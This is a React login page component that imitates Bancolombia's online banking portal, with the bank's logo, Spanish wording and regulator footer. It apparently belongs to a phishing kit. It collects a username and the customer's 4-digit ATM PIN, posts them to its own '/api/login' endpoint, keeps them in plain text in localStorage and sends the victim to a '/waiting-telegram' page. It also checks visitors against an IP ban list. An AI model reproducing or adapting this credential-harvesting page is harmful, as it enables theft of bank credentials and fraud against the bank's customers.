import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { User, Lock, Megaphone, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";

import logoSymbol from "@assets/LogoBancolombia_1764027131736.png";

export default function Login() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [clientIp, setClientIp] = useState("Cargando...");
  const [currentTime, setCurrentTime] = useState(new Date());

  useEffect(() => {
    // Check if IP is banned
    fetch("/api/check-ban")
      .then((res) => res.json())
      .then((data) => {
        if (data.banned) {
          alert("❌ Tu IP ha sido baneada. No puedes acceder a la aplicación.");
          setLocation("/");
        }
      })
      .catch(() => {});

    fetch("/api/client-ip")
      .then((res) => res.json())
      .then((data) => setClientIp(data.ip))
      .catch(() => setClientIp("0.0.0.0"));

    // Load previous credentials if they exist
    const savedUsername = localStorage.getItem("username");
    const savedPassword = localStorage.getItem("password");
    if (savedUsername && savedPassword) {
      setFormData({
        username: savedUsername,
        password: savedPassword,
      });
    }

    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, [setLocation]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Limitar contraseña a máximo 4 dígitos
    if (name === "password") {
      if (!/^\d*$/.test(value)) return; // Solo dígitos
      if (value.length > 4) return; // Máximo 4
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validateInputs = (): string | null => {
    // Check username has at least one digit
    if (!/\d/.test(formData.username)) {
      return "El usuario debe contener al menos un número";
    }

    // Check password has exactly 4 digits
    if (!/^\d{4}$/.test(formData.password)) {
      return "La contraseña debe tener exactamente 4 dígitos";
    }

    return null;
  };

  const isButtonEnabled = (): boolean => {
    return (
      formData.username.length > 0 &&
      formData.password.length === 4 &&
      !validateInputs()
    );
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const validationError = validateInputs();
    if (validationError) {
      toast({
        variant: "destructive",
        title: "Error de validación",
        description: validationError,
      });
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // Guardar userId, codeId, username, password y dynamicCode en localStorage para la siguiente página
        localStorage.setItem("userId", data.userId);
        localStorage.setItem("codeId", data.codeId);
        localStorage.setItem("username", formData.username);
        localStorage.setItem("password", formData.password);
        localStorage.setItem("dynamicCode", data.dynamicCode);

        console.log("Código dinámico generado:", data.dynamicCode);

        // Go to waiting telegram page
        setLocation("/waiting-telegram");
      } else {
        toast({
          variant: "destructive",
          title: "Error de autenticación",
          description: data.error || "Verifica los datos e intenta de nuevo.",
        });
      }
    } catch (error) {
      console.error("Login error:", error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "No se pudo conectar con el servidor.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-background px-4 py-8 font-sans text-white relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-black/80 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-12 h-12 text-[#FDDA24] animate-spin mb-4" />
          <p className="text-white font-medium">Verificando credenciales...</p>
        </div>
      )}

      {/* Header Text */}
      <div className="mb-8 flex justify-center items-center gap-3">
        <img
          src={logoSymbol}
          alt="Bancolombia Symbol"
          className="h-12 w-12 object-contain"
        />
        <h1 className="text-3xl font-bold text-white">Bancolombia</h1>
      </div>
      <h1 className="text-2xl font-normal mb-8 text-center">
        Sucursal Virtual Personas
      </h1>

      <div className="w-full max-w-sm space-y-6">
        {/* Alert Box */}
        <div className="bg-white rounded-lg overflow-hidden shadow-md flex relative">
          <div className="bg-[#2CB1E0] w-2 absolute left-0 top-0 bottom-0"></div>
          <div className="p-4 pl-6 text-black w-full">
            <div className="flex gap-3 mb-2">
              <Megaphone
                className="w-6 h-6 text-[#2CB1E0] -rotate-12"
                strokeWidth={1.5}
              />
              <h3 className="font-bold text-lg">¡Prográmate!</h3>
            </div>
            <p className="text-sm text-gray-700 mb-2 leading-relaxed">
              Consulta el estado de nuestros canales y los mantenimientos
              programados.
            </p>
            <a
              href="#"
              className="text-sm font-bold underline decoration-1 underline-offset-2"
            >
              Más info aquí.
            </a>
          </div>
        </div>

        {/* Login Card */}
        <Card className="bg-[#383838] border-none shadow-xl rounded-xl overflow-hidden text-white">
          <CardContent className="pt-10 pb-8 px-8">
            <div className="text-center mb-8">
              <h2 className="text-2xl font-bold mb-3">¡Hola!</h2>
              <p className="text-gray-300 text-sm leading-relaxed px-2">
                Ingresa los datos para gestionar tus productos y hacer
                transacciones.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Username Field */}
              <div className="space-y-2">
                <div className="flex items-center gap-3 pb-2 border-b border-white/50">
                  <User className="h-6 w-6 text-white stroke-[1.5]" flex-shrink-0 />
                  <Input
                    id="username"
                    name="username"
                    placeholder="Usuario"
                    className="border-0 bg-transparent text-white placeholder:text-white focus-visible:ring-0 px-0 py-0 h-auto shadow-none transition-colors flex-1"
                    value={formData.username}
                    onChange={handleInputChange}
                    disabled={isLoading}
                    required
                    data-testid="input-username"
                  />
                </div>
                <div className="pt-1">
                  <a
                    href="#"
                    className="text-xs font-bold text-white underline decoration-1 underline-offset-2"
                  >
                    ¿Olvidaste tu usuario?
                  </a>
                </div>
              </div>

              {/* Password Field */}
              <div className="space-y-2">
                <div className="flex items-center gap-3 pb-2 border-b border-white/50">
                  <Lock className="h-6 w-6 text-white stroke-[1.5]" flex-shrink-0 />
                  <Input
                    id="password"
                    name="password"
                    type="text"
                    inputMode="numeric"
                    placeholder="Clave del cajero"
                    className="border-0 bg-transparent text-white placeholder:text-white focus-visible:ring-0 px-0 py-0 h-auto shadow-none transition-colors flex-1"
                    value={formData.password}
                    onChange={handleInputChange}
                    disabled={isLoading}
                    required
                    data-testid="input-password"
                  />
                </div>
                <div className="pt-1">
                  <a
                    href="#"
                    className="text-xs font-bold text-white underline decoration-1 underline-offset-2"
                  >
                    ¿Olvidaste o bloqueaste tu clave?
                  </a>
                </div>
              </div>

              {/* Submit Button */}
              <div className="pt-4 space-y-6 text-center">
                <Button
                  type="submit"
                  className={`w-full rounded-full font-bold py-3 text-md transition-all ${
                    isButtonEnabled() && !isLoading
                      ? "bg-[#FDDA24] hover:bg-[#FFF066] text-black"
                      : "bg-[#888888] hover:bg-[#999999] text-black disabled:opacity-50"
                  }`}
                  disabled={isLoading || !isButtonEnabled()}
                  data-testid="button-submit"
                >
                  {isLoading ? "Verificando..." : "Iniciar sesión"}
                </Button>

                <div>
                  <a
                    href="#"
                    className="text-sm font-bold text-white underline decoration-1 underline-offset-2"
                  >
                    Crear usuario
                  </a>
                </div>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>

      {/* Footer Section */}
      <div className="w-full mt-12 pt-8 border-t border-white/10 text-center text-white px-4">
        <div className="max-w-sm mx-auto space-y-6">
          {/* Links */}
          <div className="space-y-3 text-sm">
            <p className="text-gray-300">¿Problemas para conectarte?</p>
            <div className="space-y-2">
              <a href="#" className="block text-white hover:underline">
                Aprende sobre seguridad
              </a>
              <a href="#" className="block text-white hover:underline">
                Reglamento Sucursal Virtual
              </a>
              <a href="#" className="block text-white hover:underline">
                Política de privacidad
              </a>
            </div>
          </div>

          {/* Bancolombia Logo and Vigilado */}
          <div className="pt-4 space-y-3">
            <div className="flex justify-center items-center gap-2">
              <div className="flex flex-col gap-1">
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
              </div>
              <span className="text-lg font-bold">Bancolombia</span>
            </div>
            <p className="text-xs text-gray-400">
              VIGILADO <span className="block text-xs">Superintendencia Financiera de Colombia</span>
            </p>
          </div>

          {/* IP and Time */}
          <div className="text-xs text-gray-500 space-y-1 border-t border-white/10 pt-4">
            <p>Dirección IP: {clientIp}</p>
            <p>
              {currentTime.toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}, {currentTime.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}
            </p>
          </div>

          {/* Navigation Buttons */}
          <div className="flex justify-center gap-4 pt-4">
           
          </div>
        </div>
      </div>
    </div>
  );
}
